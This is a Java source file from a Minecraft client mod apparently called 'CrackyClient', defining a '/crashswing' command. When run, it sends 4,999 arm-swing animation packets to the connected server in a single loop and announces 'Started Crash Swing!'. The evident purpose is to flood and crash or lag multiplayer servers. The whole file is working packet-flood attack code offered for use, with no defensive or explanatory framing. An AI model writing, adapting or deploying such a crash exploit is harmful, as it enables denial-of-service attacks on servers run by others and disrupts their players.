package at.dietze.crashclient.commands;

import net.minecraft.client.Minecraft;
import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.util.IChatComponent;

public class CrashSwing extends CommandBase {

	@Override
	public String getCommandName() {
		// TODO Auto-generated method stub
		return "crashswing";
	}

	@Override
	public int getRequiredPermissionLevel() {
		return 0;
	}
	
	@Override
	public String getCommandUsage(ICommandSender sender) {
		// TODO Auto-generated method stub
		return "/" + getCommandName();
	}

	@Override
	public void processCommand(ICommandSender sender, String[] args) throws CommandException {
		Minecraft.getMinecraft().thePlayer.addChatComponentMessage((IChatComponent) new ChatComponentText(EnumChatFormatting.DARK_AQUA + "{CrackyClient} Started Crash Swing!"));
		for (int i = 0; i < 4999; i++) {
			Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C0APacketAnimation());
			System.out.println("Swinged " + i + " times ");
		}
		
	}

}
